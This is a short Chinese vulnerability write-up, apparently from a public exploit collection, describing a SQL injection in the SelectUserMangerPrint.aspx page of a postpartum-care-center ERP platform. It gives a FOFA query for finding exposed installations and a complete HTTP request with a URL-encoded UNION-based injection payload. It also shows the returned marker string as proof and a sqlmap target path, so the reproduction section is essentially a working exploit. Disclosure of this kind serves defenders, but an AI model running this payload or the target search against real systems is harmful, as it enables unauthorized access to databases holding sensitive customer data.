# 月子会所ERP管理云平台SelectUserMangerPrint存在SQL注入漏洞

# 一、漏洞简介
月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。月子会所ERP管理云平台SelectUserMangerPrint存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。

# 二、影响版本
+ 月子会所ERP管理云平台

# 三、资产测绘
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面

![1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab.png](./img/PbyyHJcsNm9df-Mp/1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab-570049.png)

# 四、漏洞复现
```java
GET /Page/SalerManager/SelectUserMangerPrint.aspx?id=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%28113%29%2BCHAR%2870%29%2BCHAR%28108%29%2BCHAR%2883%29%2BCHAR%28111%29%2BCHAR%28106%29%2BCHAR%2888%29%2BCHAR%2878%29%2BCHAR%2884%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28103%29%2BCHAR%28110%29%2BCHAR%28109%29%2BCHAR%2897%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%2876%29%2BCHAR%2878%29%2BCHAR%2880%29%2BCHAR%28113%29%2BCHAR%2868%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2878%29%2BCHAR%2898%29%2BCHAR%2890%29%2BCHAR%28108%29%2BCHAR%28113%29%2BCHAR%2874%29%2BCHAR%2883%29%2BCHAR%2868%29%2BCHAR%2882%29%2BCHAR%28117%29%2BCHAR%2873%29%2BCHAR%2877%29%2BCHAR%2874%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL--+EfIE HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=mf1ihdp1nrlqfspeocl1np1d
Upgrade-Insecure-Requests: 1
```

![1710301276767-6643edd8-3299-4694-90cd-424500930546.png](./img/PbyyHJcsNm9df-Mp/1710301276767-6643edd8-3299-4694-90cd-424500930546-346858.png)

```java
qqxbqRqFlSojXNTpzgnmaqktHLNPqDvpNbZlqJSDRuIMJqzvxq
```

sqlmap

```java
/Page/SalerManager/SelectUserMangerPrint.aspx?id=1
```

![1710301303427-1c124b60-b297-4df6-9ce0-f9df37306055.png](./img/PbyyHJcsNm9df-Mp/1710301303427-1c124b60-b297-4df6-9ce0-f9df37306055-662745.png)



> 更新: 2024-04-17 17:13:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fef6ey5vk0gh2g2s>